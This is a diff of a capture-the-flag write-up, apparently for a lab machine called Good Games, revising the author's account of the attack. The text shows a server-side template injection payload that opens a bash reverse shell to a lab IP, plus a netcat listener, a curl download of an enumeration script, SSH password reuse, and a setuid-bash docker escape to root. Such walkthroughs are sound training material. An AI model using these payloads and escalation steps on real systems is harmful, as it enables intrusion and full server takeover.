@@ -93,7 +93,7 @@ As you can see after entering the payload
 
 \{\{7*7\}\}
 
-For the full name, upon saving this the templating engine has interpreted this as 49.  So we have a SSTI vulnerability we can exploit.  After heading over to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) which is a great resource.  Within the SSTI section I found some payloads which could potentially give us RCE or remote code execution. 
+For the full name, upon saving this the templating engine has interpreted this as 49.  So we have a SSTI vulnerability we can exploit.  After heading over to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) which is a great resource and within the SSTI section I found some payloads which could potentially give us RCE or remote code execution. 
 
 I used the payload 
 
@@ -104,14 +104,22 @@ and entered a date of birth and phone number and hit save.
 [<img src="../images/good_games/ssti_id.png"
   style="width: 800px;"/>](../images/good_games/ssti_id.png)
 
-As you can see from the username on the right of the page it is showing we have code execution and we actually have it as the root user. 
+As you can see from the username on the right of the page it is showing we have the result from the `id` command, which tells us we are the root user and proves we have code execution. 
 
 So now it was time to leverage this code execution to get a reverse shell on the server.  With the payload 
 
 \{\{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.36/9001 0>&1"').read()\}\}
 
+While also setting up my netcat listener on my kali machine
+
+```bash
+nc -lvnp 9001
+```
+
 [<img src="../images/good_games/rev_shell.png"
   style="width: 800px;"/>](../images/good_games/rev_shell.png)
+  
+After submitting this request the page hangs, which is always a good sign. I switched back to the terminal where I had set up my listener and:
   
 [<img src="../images/good_games/rev_shell_success.png"
   style="width: 800px;"/>](../images/good_games/rev_shell_success.png)
@@ -132,14 +140,20 @@ enter enter.  Then so I could clear my terminal
 export TERM=xterm
 ``` 
 
-I found the `/home/augustus` directory and the user.txt file with the user flag.  But after poking around it became apparent I was not on the host machine.  It appeared I was inside a docker instance.  But the Augustus user was not mentioned in the `/etc/passwd` file which means it must be a user on the host machine. 
+I found the `/home/augustus` directory and the user.txt file with the user flag.  
 
-I then downloaded and used a tool [deepce](https://github.com/stealthcopter/deepce).  I downloaded the latest version, created a python webserver on my attack machine 
+But after looking around it became apparent I was not on the host machine.  It appeared I was inside a docker instance.  But the Augustus user was not mentioned in the `/etc/passwd` file which meant it must be a user on the host machine. 
+
+I then downloaded and used a tool [deepce](https://github.com/stealthcopter/deepce) which allowed me to gather some information about the docker instance I was currently inside.  I downloaded the latest version, created a python webserver on my attack machine 
 
 ```bash
 python3 -m http-server 8000
 ``` 
-and transferred it to the victim machine.  
+and transferred it to the victim machine. 
+
+```bash
+curl http://10.10.14.36:8000/deepce.sh
+```
 
 [<img src="../images/good_games/deepce.png"
   style="width: 800px;"/>](../images/good_games/deepce.png)
@@ -147,7 +161,7 @@ and transferred it to the victim machine.
 [<img src="../images/good_games/deepce_results.png"
   style="width: 800px;"/>](../images/good_games/deepce_results.png)
   
-From the results I could see a potential IP for the host machine of `172.19.0.1`.  I could have tried to enumerate what ports were open on this IP but I thought I would try my luck with SSH and wondered if the admin had reused the same password again. Surely not...
+From the results I could see a potential IP for the host machine of `172.19.0.1`.  I could have tried to enumerate which ports were open on this IP but I thought I would try my luck with SSH and wondered if the admin had reused the same password again. Surely not...
 
 [<img src="../images/good_games/ssh_success.png"
   style="width: 800px;"/>](../images/good_games/ssh_success.png)
@@ -156,9 +170,9 @@ Wow.  I have learnt while doing other machines that reuse of password is such a 
 
 At this point I got a little stuck with the privilege escalation part of the machine.  I ran LinPeas on the host machine and didn't get anything interesting.  
 
-I poked around at all the usual config files and found some secret_keys for the DB and confirmed the hashed password I had found earlier was there.  
+I checked all the usual config files and found some secret_keys for the DB and confirmed the hashed password I had found earlier was there.  
 
-After a while I realised that as I was root on the docker container, if I could run a binary with root privileges as Augustus and retained the privileges it would get me root on the host machine. 
+After a while I realised that as I was root on the docker container, if I could run a binary with root privileges as Augustus and retain root privileges it would get me root on the host machine too. 
 
 So I thought the easiest way to do this would be to copy the legitimate `/bin/bash` file on the host machine to `/home/augustus` directory.  I then switched back to the root user within the docker container and set ownership of `bin/bash` as root. And made the file a setuid executable.
 
@@ -177,6 +191,8 @@ I then logged back into SSH with augustus and ran `./bash -p` to retain privileg
 [<img src="../images/good_games/priv_esc.png"
   style="width: 800px;"/>](../images/good_games/priv_esc.png)
   
-From there I was able to access `/root/root.txt` for the system flag.  And that was the box.  I found the first part of the box really fun and easy to find common web vulnerabilities.  The privilege escalation path was not something I have had to do before (escape from a docker container) but was really interesting and I have certainly learnt a few new tricks and technniques. 
+From there I was able to access `/root/root.txt` for the system flag.  And that was the box.  
+
+I found the first part of the box really fun and got to exploit some common web vulnerabilities.  The privilege escalation path was not something I have had to do before (escape from a docker container) but was really fun and interesting and I have certainly learnt a few new tricks and technniques. 
 
 Thank you to the creator TheCyberGeek for the machine.
